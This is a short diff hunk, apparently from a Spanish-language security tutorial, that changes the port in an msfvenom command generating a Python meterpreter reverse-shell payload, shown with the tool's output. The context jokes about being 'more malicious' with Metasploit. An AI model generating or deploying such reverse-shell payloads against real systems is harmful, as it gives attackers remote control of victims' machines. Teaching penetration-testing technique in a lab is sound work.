@@ -81,7 +81,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 Para ser más malévolos, usemos Metasploit O:) ...
 
 ```bash
-msfvenom -p python/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 -o script.py
+msfvenom -p python/meterpreter/reverse_tcp LHOST=localhost LPORT=4445 -o script.py
 No platform was selected, choosing Msf::Module::Platform::Python from the payload
 No Arch selected, selecting Arch: python from the payload
 No encoder or badchars specified, outputting raw payload
